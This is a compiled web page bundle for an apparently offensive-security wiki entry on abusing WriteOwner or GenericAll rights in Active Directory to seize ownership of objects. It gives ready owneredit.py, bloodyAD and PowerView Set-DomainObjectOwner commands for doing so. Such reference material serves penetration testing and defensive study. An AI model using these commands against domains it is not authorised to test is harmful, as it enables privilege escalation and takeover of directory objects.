import{_ as r,c as o,j as i,a as e,G as s,w as a,B as n,o as k}from"./chunks/framework.B5CpDqM0.js";const C=JSON.parse('{"title":"Grant ownership","description":"","frontmatter":{"authors":"CravateRouge, ShutdownRepo, sckdev"},"headers":[],"relativePath":"ad/movement/dacl/grant-ownership.md","filePath":"ad/movement/dacl/grant-ownership.md","lastUpdated":1724982529000}'),d={name:"ad/movement/dacl/grant-ownership.md"};function p(g,t,c,F,b,y){const l=n("PluginTabsTab"),h=n("PluginTabs");return k(),o("div",null,[t[2]||(t[2]=i("h1",{id:"grant-ownership",tabindex:"-1"},[e("Grant ownership "),i("a",{class:"header-anchor",href:"#grant-ownership","aria-label":'Permalink to "Grant ownership"'},"â€‹")],-1)),t[3]||(t[3]=i("p",null,[e("t has the following command-line arguments.This abuse can be carried out when controlling an object that has "),i("code",null,"WriteOwner"),e(" or "),i("code",null,"GenericAll"),e(" over any object.")],-1)),t[4]||(t[4]=i("p",null,[e("The attacker can update the owner of the target object. Once the object owner has been changed to a principal the attacker controls, the attacker may manipulate the object any way they see fit. For instance, the attacker could change the target object's permissions and "),i("a",{href:"./grant-rights"},"grant rights"),e(".")],-1)),s(h,null,{default:a(()=>[s(l,{label:"UNIX-like"},{default:a(()=>t[0]||(t[0]=[i("p",null,[e("From UNIX-like systems, this can be done with "),i("a",{href:"https://github.com/SecureAuthCorp/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),e("'s owneredit.py (Python).")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"owneredit.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -action"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," write"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -owner"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'attacker'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -target"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'victim'"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN'/'USER':'PASSWORD'")])])])],-1),i("p",null,[e("Alternatively, it can be achieved using "),i("a",{href:"https://github.com/CravateRouge/bloodyAD",target:"_blank",rel:"noreferrer"},"bloodyAD")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"bloodyAD"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --host"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -d"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," set"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," owner"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TargetObject $ControlledPrincipal")])])])],-1)])),_:1}),s(l,{label:"Windows"},{default:a(()=>t[1]||(t[1]=[i("p",null,[e("From Windows systems, this can be achieved with "),i("a",{href:"https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObjectOwner/",target:"_blank",rel:"noreferrer"},"Set-DomainObjectOwner"),e(" ("),i("a",{href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",target:"_blank",rel:"noreferrer"},"PowerView"),e(" module).")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Set-DomainObjectOwner"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Identity"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'target_object'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -OwnerIdentity"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'controlled_principal'")])])])],-1)])),_:1})]),_:1})])}const m=r(d,[["render",p]]);export{C as __pageData,m as default};
